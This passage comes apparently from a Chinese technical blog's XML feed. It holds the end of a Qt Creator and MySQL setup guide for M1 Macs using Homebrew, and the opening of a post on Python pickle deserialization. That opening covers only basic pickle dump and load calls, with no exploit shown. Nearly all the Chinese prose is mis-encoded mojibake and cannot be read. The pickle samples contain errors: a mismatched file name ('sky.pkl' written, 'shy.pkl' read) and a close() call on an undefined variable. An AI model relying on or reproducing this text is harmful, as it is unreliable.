qt</span><br></pre></td></tr></table></figure></div><p>æ£€éªŒæ˜¯å¦å®‰è£…æˆåŠŸ,æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå›æ˜¾ä¿¡æ¯æ¯”è¾ƒå¤šï¼Œå¯ä»¥çœ‹è§è·¯å¾„</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew info qt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ub18t5pfj20vm0jq7a1.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h2 id="å®‰è£…HomeBrew-Cask"><a href="#å®‰è£…HomeBrew-Cask" class="headerlink" title="å®‰è£…HomeBrew-Cask"></a>å®‰è£…HomeBrew-Cask</h2><p>caskå¯ä»¥å®‰è£….appçš„è½¯ä»¶</p><p>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨å›½å†…æºæ‰‹åŠ¨cloneä¸‹è½½ï¼ˆæ¨èï¼‰<br>åˆ›å»ºhomebrew-caskæ–‡ä»¶å¤¹<br>è¿›å…¥homebrewç›®å½•ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;$(brew --repo)/Library/Taps/homebrew/&quot;</span><br></pre></td></tr></table></figure></div><p>åˆ›å»ºhomebrew-caskæ–‡ä»¶å¤¹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir homebrew-cask</span><br></pre></td></tr></table></figure></div><p>å¼€å§‹clone</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://mirrors.ustc.edu.cn/homebrew-cask.git/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask</span><br></pre></td></tr></table></figure></div><p>æ–¹æ³•äºŒï¼šåˆ©ç”¨å®˜ç½‘æ–‡ä»¶å®‰è£…<br>ä»å®˜ç½‘ä¸Šä¸‹è½½<code>homebrew-cask-master.zip</code>å‹ç¼©åŒ…ï¼Œè§£å‹åå°†æ–‡ä»¶å¤¹åæ”¹ä¸º<code>homebrew-cask</code><br>ç„¶åå°†å…¶æ‹·è´æ”¾å…¥<code>/usr/local/Homebrew/Library/Taps/homebrew</code>ä¸­ï¼Œä¸<code>homebrew-core</code>æ–‡ä»¶å¤¹åŒçº§</p><blockquote><p>å®˜ç½‘: <a class="link"   href="https://github.com/Homebrew/homebrew-cask" >https://github.com/Homebrew/homebrew-cask <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="å®‰è£…qt-creator"><a href="#å®‰è£…qt-creator" class="headerlink" title="å®‰è£…qt creator"></a>å®‰è£…qt creator</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt-creator</span><br></pre></td></tr></table></figure></div><p>å®‰è£…å®Œå‘ç°å¯åŠ¨å°å¤šäº†ä¸€ä¸ªè½¯ä»¶ï¼Œæ‰“å¼€</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ub7miil3j20bo086wej.png"                      alt="."                ><figcaption>.</figcaption></figure></p><h2 id="é…ç½®qt-creator"><a href="#é…ç½®qt-creator" class="headerlink" title="é…ç½®qt creator"></a>é…ç½®qt creator</h2><p>æ‰“å¼€é¦–é€‰é¡¹<figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ub8lv3wbj20ds0e6gmk.png?"                      alt="."                ><figcaption>.</figcaption></figure></p><p>é…ç½®kitsï¼Œä¸»è¦æ˜¯Qt Versionå’ŒDebuggers</p><p>e6c9d24egy1h1ub8lv3wbj20ds0e6gmk<figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucbt7jxhj21ef0u0jvk.png"                      alt="2"                ><figcaption>2</figcaption></figure></p><h3 id="é…ç½®Qt-Version"><a href="#é…ç½®Qt-Version" class="headerlink" title="é…ç½®Qt Version"></a>é…ç½®Qt Version</h3><p>åœ¨ç»ˆç«¯å…ˆæŸ¥çœ‹qtè·¯å¾„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew info qt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucdiut0nj21ce0hoq9l.png"                      alt="3"                ><figcaption>3</figcaption></figure></p><blockquote><p>ä»¥æˆ‘è¿™é‡Œä¸ºä¾‹æ˜¯åœ¨<code>/opt/homebrew/Cellar/qt/6.2.3_1</code></p></blockquote><p>è¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œè®¿é—®<code>bin</code>æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°qmakeæ–‡ä»¶ï¼Œæœ€åå°†è¯¥è·¯å¾„å¡«å…¥Qt version</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/homebrew/Cellar/qt/6.2.3_1/bin/qmake</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucgvl5bhj21f70u0dk0.png"                      alt="4"                ><figcaption>4</figcaption></figure></p><h3 id="é…ç½®Debuggers"><a href="#é…ç½®Debuggers" class="headerlink" title="é…ç½®Debuggers"></a>é…ç½®Debuggers</h3><p>ä¸€èˆ¬æœ‰é»˜è®¤è‡ªåŠ¨æ£€æµ‹åˆ°çš„LLDBï¼Œå¦‚æœæ²¡æœ‰å°±æ·»åŠ æˆ‘å›¾ç¤ºä¸­Xcodeä¸‹çš„LLDB(è¦å…ˆè£…Xcode)</p><p>è·¯å¾„ï¼š<code>/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucjcdt7hj21dx0u00vy.png"                      alt="5"                ><figcaption>5</figcaption></figure></p><h3 id="è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬"><a href="#è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬" class="headerlink" title="è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬"></a>è¿”å›åˆ°Kitsé€‰æ‹©åˆšåˆšé…ç½®å¥½çš„ç‰ˆæœ¬</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹è¿™é‡Œçš„ç¼–è¯‘å™¨(Compiler)éƒ½ä¼šè‡ªåŠ¨æ£€æµ‹åˆ°æœ¬æœºæ‰€å¸¦ç¯å¢ƒï¼Œä¸ç”¨æ›´æ”¹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1uckxzx6bj21n00u0q81.png"                      alt="6"                ><figcaption>6</figcaption></figure></p><h3 id="æ–°å»ºä¸€ä¸ªé¡¹ç›®"><a href="#æ–°å»ºä¸€ä¸ªé¡¹ç›®" class="headerlink" title="æ–°å»ºä¸€ä¸ªé¡¹ç›®"></a>æ–°å»ºä¸€ä¸ªé¡¹ç›®</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucm7hh0gj21ni0u076u.png"                      alt="7"                ><figcaption>7</figcaption></figure></p><h3 id="é€‰æ‹©æ¨¡ç‰ˆ"><a href="#é€‰æ‹©æ¨¡ç‰ˆ" class="headerlink" title="é€‰æ‹©æ¨¡ç‰ˆ"></a>é€‰æ‹©æ¨¡ç‰ˆ</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucmnslqlj21c60u0acl.png"                      alt="8"                ><figcaption>8</figcaption></figure></p><h3 id="é€‰æ‹©è·¯å¾„-ä¸èƒ½å¸¦ä¸­æ–‡"><a href="#é€‰æ‹©è·¯å¾„-ä¸èƒ½å¸¦ä¸­æ–‡" class="headerlink" title="é€‰æ‹©è·¯å¾„(ä¸èƒ½å¸¦ä¸­æ–‡)"></a>é€‰æ‹©è·¯å¾„(ä¸èƒ½å¸¦ä¸­æ–‡)</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucnji2ynj218g0tcwgp.png"                      alt="9"                ><figcaption>9</figcaption></figure></p><h3 id="é€‰æ‹©qmake"><a href="#é€‰æ‹©qmake" class="headerlink" title="é€‰æ‹©qmake"></a>é€‰æ‹©qmake</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1uco09mb9j218g0tcgn0.png"                      alt="10"                ><figcaption>10</figcaption></figure></p><h3 id="å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits-é€‰æ‹©åˆšåˆšé…ç½®çš„"><a href="#å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits-é€‰æ‹©åˆšåˆšé…ç½®çš„" class="headerlink" title="å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits,é€‰æ‹©åˆšåˆšé…ç½®çš„"></a>å‰©ä¸‹ä¸€ç›´éƒ½ç‚¹ç»§ç»­ï¼Œç›´åˆ°Kits,é€‰æ‹©åˆšåˆšé…ç½®çš„</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucp7tqxcj218g0tc76c.png"                      alt="11"                ><figcaption>11</figcaption></figure></p><h3 id="æ„å»ºé¡¹ç›®"><a href="#æ„å»ºé¡¹ç›®" class="headerlink" title="æ„å»ºé¡¹ç›®"></a>æ„å»ºé¡¹ç›®</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucpqyve4j218g0tcjtd.png"                      alt="12"                ><figcaption>12</figcaption></figure></p><h3 id="è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†"><a href="#è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†" class="headerlink" title="è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†"></a>è¿è¡Œé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ç©ºç™½æ¡†</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucr1dk8zj20tg0gqdgs.png"                      alt="."                ><figcaption>.</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24egy1h1ucrjmkltj20zu0si750.png"                      alt="."                ><figcaption>.</figcaption></figure></p><blockquote><p>å…·ä½“çš„ä½¿ç”¨å¯ä»¥å»bç«™æœqtæ•™ç¨‹</p></blockquote><h2 id="Qtæ­é…mysql"><a href="#Qtæ­é…mysql" class="headerlink" title="Qtæ­é…mysql"></a>Qtæ­é…mysql</h2><h3 id="åŠ¨æ€é“¾æ¥åº“ä¸‹è½½"><a href="#åŠ¨æ€é“¾æ¥åº“ä¸‹è½½" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“ä¸‹è½½"></a>åŠ¨æ€é“¾æ¥åº“ä¸‹è½½</h3><p>è‹¥è¦æ­é…mysqlå†™é¡¹ç›®ï¼Œéœ€è¦æ·»åŠ åŠ¨æ€é“¾æ¥åº“<code>libqsqlmysql.dylib</code>ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†æ•™ç¨‹éƒ½æ˜¯ä¸‹è½½qtæºç è¿›è¡Œç¼–è¯‘ï¼Œä½†ç”±äºM1æ˜¯arm64æ¶æ„ï¼Œç¼–è¯‘çš„è¿‡ç¨‹ä¼šæœ‰å¾ˆå¤šæŠ¥é”™ä»¥åŠè·¯å¾„ä¸å¯¹çš„é—®é¢˜ï¼Œç½‘ä¸Šèƒ½ä¸‹è½½çš„åŠ¨æ€é“¾æ¥åº“ä¹Ÿå¤§å¤šä¸æ˜¯armæ¶æ„çš„ï¼Œå› æ­¤ä¸å¾—ä¸æåˆ°macä¸‹çš„ç¥å™¨<code>homebrew</code>,ç»ˆç«¯æ‰§è¡Œå‘½ä»¤</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt-mysql</span><br></pre></td></tr></table></figure></div><blockquote><p>brewä¼šè‡ªåŠ¨åŒ¹é…ä¸‹è½½æœ€æ–°qtç‰ˆæœ¬çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå› æ­¤å»ºè®®qtä¹Ÿä½¿ç”¨homebrewå®‰è£…</p></blockquote><p>è¿›å…¥ç›®å½•<code>/opt/homebrew/Cellar/qt-mysql/6.2.3/share/qt/plugins/sqldrivers</code>å°†è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“æ”¾åˆ°<code>/opt/homebrew/Cellar/qt/6.2.3_1/share/qt/plugins/sqldrivers</code>ä¸­</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24ely1h4xfpipwhjj21fg0okgng.png"                      alt="13"                ><figcaption>13</figcaption></figure></p><blockquote><p>æ³¨æ„ç‰ˆæœ¬å·å¯¹åº”</p></blockquote><h3 id="å¼•å…¥SQLæ¨¡å—"><a href="#å¼•å…¥SQLæ¨¡å—" class="headerlink" title="å¼•å…¥SQLæ¨¡å—"></a>å¼•å…¥SQLæ¨¡å—</h3><p>åœ¨é¡¹ç›®çš„.proæ–‡ä»¶çš„é¦–è¡ŒåŠ ä¸Šsql</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui sql <span class="comment">//ä¿®æ”¹å¤„</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">greaterThan</span>(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets</span><br><span class="line"></span><br><span class="line">CONFIG += c+<span class="number">+17</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div><h3 id="è¿æ¥mysqlæ•°æ®åº“"><a href="#è¿æ¥mysqlæ•°æ®åº“" class="headerlink" title="è¿æ¥mysqlæ•°æ®åº“"></a>è¿æ¥mysqlæ•°æ®åº“</h3><p>è¿›å…¥qté¡¹ç›®æ‰§è¡Œä»¥ä¸‹ä»£ç æ‰“å°æ•°æ®åº“é©±åŠ¨</p><p>mainwindow.cpp</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;QSqlError&gt;</span></span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="built_in">qDebug</span>()&lt;&lt;QSqlDatabase::<span class="built_in">drivers</span>();<span class="comment">//æŸ¥çœ‹å½“å‰å¯ç”¨é©±åŠ¨</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ç”¨é©±åŠ¨ä¸­æœ‰QMYSQLå³ä¸ºæˆåŠŸ</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/e6c9d24ely1h4xg0zi3z4j20gk02yglv.png"                      alt="."                ><figcaption>.</figcaption></figure></p></blockquote><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QSqlDatabase db=QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QMYSQL&quot;</span>);<span class="comment">//æ·»åŠ ä¸€ä¸ªæ•°æ®åº“</span></span><br><span class="line">db.<span class="built_in">setHostName</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//è®¾ç½®ä¸»æœºip</span></span><br><span class="line">db.<span class="built_in">setUserName</span>(<span class="string">&quot;username&quot;</span>);<span class="comment">//mysqlæ•°æ®åº“ç”¨æˆ·å</span></span><br><span class="line">db.<span class="built_in">setPassword</span>(<span class="string">&quot;password&quot;</span>);<span class="comment">//å¯†ç </span></span><br><span class="line">db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;db&quot;</span>);<span class="comment">//è¿æ¥çš„æ•°æ®åº“å</span></span><br><span class="line"><span class="keyword">if</span>(db.<span class="built_in">open</span>()==<span class="literal">false</span>)&#123;<span class="comment">//æ‰“å¼€å¤±è´¥çš„è­¦å‘Š</span></span><br><span class="line">    QMessageBox::<span class="built_in">warning</span>(<span class="keyword">this</span>,<span class="string">&quot;waring&quot;</span>,db.<span class="built_in">lastError</span>().<span class="built_in">text</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿è¡Œé¡¹ç›®åªè¦æ²¡æœ‰è­¦å‘Šæ¡†å¼¹å‡ºå°±è¯´æ˜è¿æ¥æ•°æ®åº“æˆåŠŸ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> qt </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pickleååºåˆ—åŒ–æ¼æ´</title>
      <link href="/2022/08/03/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/08/03/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-Pickleååºåˆ—åŒ–æ¼æ´"><a href="#Python-Pickleååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Python Pickleååºåˆ—åŒ–æ¼æ´"></a>Python Pickleååºåˆ—åŒ–æ¼æ´</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="0x00-Pickle-x2F-CPickle"><a href="#0x00-Pickle-x2F-CPickle" class="headerlink" title="0x00:Pickle&#x2F;CPickle"></a>0x00:Pickle&#x2F;CPickle</h3><p><code>pickle</code>æˆ–<code>cPickle</code>ï¼Œä½œç”¨å’Œ<code>PHPçš„serializeä¸unserialize</code>ä¸€æ ·ï¼Œä¸¤è€…åªæ˜¯å®ç°çš„è¯­è¨€ä¸åŒï¼Œä¸€ä¸ªæ˜¯çº¯Pythonå®ç°ã€å¦ä¸€ä¸ªæ˜¯Cå®ç°ï¼Œå‡½æ•°è°ƒç”¨åŸºæœ¬ç›¸åŒï¼Œä½†cPickleåº“çš„æ€§èƒ½æ›´å¥½,ä¹‹åå°±ä»¥pickleåº“æ¥è¿›è¡Œæ¼”ç¤º</p><h3 id="0x01-Pickleåº“åŠå‡½æ•°"><a href="#0x01-Pickleåº“åŠå‡½æ•°" class="headerlink" title="0x01:Pickleåº“åŠå‡½æ•°"></a>0x01:Pickleåº“åŠå‡½æ•°</h3><p>pickleæ˜¯pythonè¯­è¨€çš„ä¸€ä¸ªæ ‡å‡†æ¨¡å—ï¼Œå®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚<br>pickleæ¨¡å—æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆä¿å­˜æ–‡ä»¶çš„åç¼€ä¸º<code>.pkl</code>ï¼‰ï¼Œä¸èƒ½ç›´æ¥æ‰“å¼€è¿›è¡Œé¢„è§ˆã€‚</p><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">dumps</td><td align="center">å¯¹è±¡ååºåˆ—åŒ–ä¸ºbyteså¯¹è±¡</td></tr><tr><td align="center">dump</td><td align="center">å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡ï¼Œå­˜å…¥æ–‡ä»¶</td></tr><tr><td align="center">loads</td><td align="center">ä»byteså¯¹è±¡ååºåˆ—åŒ–</td></tr><tr><td align="center">load</td><td align="center">å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</td></tr></tbody></table><h3 id="dump-x2F-load"><a href="#dump-x2F-load" class="headerlink" title="dump&#x2F;load"></a>dump&#x2F;load</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åºåˆ—åŒ–</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>,)</span><br><span class="line">objè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡(å¿…å¡«å‚æ•°ï¼‰</span><br><span class="line">fileè¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡</span><br><span class="line">ä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb(å¿…å¡«å‚æ•°ï¼‰</span><br><span class="line"><span class="comment">#ååºåˆ—åŒ–</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line">fileæ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡</span><br><span class="line">ä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb(å¿…å¡«å‚æ•°)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">    <span class="variable language_">self</span>.a=a</span><br><span class="line">    <span class="variable language_">self</span>.b=b</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  test=Test1(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Lemon&#x27;</span>)</span><br><span class="line">  fp1=<span class="built_in">open</span>(<span class="string">&quot;sky.pkl&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">  pickle.dump(test,fp1) <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line">  fp1.close()</span><br><span class="line">  fp2=<span class="built_in">open</span>(<span class="string">&quot;shy.pkl&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">  data=pickle.load(fp2) <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">  fp2.close()</span><br></pre></td></tr></table></figure></div><h3 id="dumps-x2F-loads"><a href="#dumps-x2F-loads" class="headerlink" title="dumps&#x2F;loads"></a>dumps&#x2F;loads</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åºåˆ—åŒ–</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>,*,fix_imports=<span class="literal">True</span>)</span><br><span class="line">dumps()æ–¹æ³•ä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„<span class="built_in">bytes</span>å¯¹è±¡ã€‚</span><br><span class="line"><span class="comment">#ååºåˆ—åŒ–</span></span><br><span class="line">pickle.loads(bytes_object, *,fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>. errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">loads()æ–¹æ³•æ˜¯ç›´æ¥ä»<span class="built_in">bytes</span>å¯¹è±¡ä¸­è¯»å–åºåˆ—åŒ–çš„ä¿¡æ¯ï¼Œè€Œéä»æ–‡ä»¶ä¸­è¯»å–ã€‚</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">    <span class="variable language_">self</span>.a=a</span><br><span class="line">    <span class="variable language_">self</span>.b=b</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  test=Test1(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Lemon&#x27;</span>)</span><br><span class="line">  <span class="built_in">str</span>=pickle.dumps(test) <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line">  data=pickle.loads(<span class="built_in">str</span>) <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">  fp2.close()</span><br></pre></td></tr></table></figure></div><blockquote><p>åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ¶‰åŠåˆ°PVM</p></blockquote><h3 id="0x02-PVMâ€“pythonè™šæ‹Ÿæœº"><a href="#0x02-PVMâ€“pythonè™šæ‹Ÿæœº" class="headerlink" title="0x02 PVMâ€“pythonè™šæ‹Ÿæœº"></a>0x02 PVMâ€“pythonè™šæ‹Ÿæœº</h3><h4 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>ä¸JVMç±»ä¼¼ï¼Œå®ƒå¯ä»¥ç›´æ¥ä»æºä»£ç è¿è¡Œç¨‹åºã€‚Pythonè§£é‡Šå™¨ä¼šå°†æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œç„¶åå°†ç¼–è¯‘åçš„å­—èŠ‚ç è½¬å‘åˆ°Pythonè™šæ‹Ÿæœºä¸­æ‰§è¡Œã€‚æ€»çš„æ¥è¯´ï¼ŒPVMçš„ä½œç”¨ä¾¿æ˜¯ç”¨æ¥è§£é‡Šå­—èŠ‚ç çš„è§£é‡Šå¼•æ“ã€‚</p><h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" 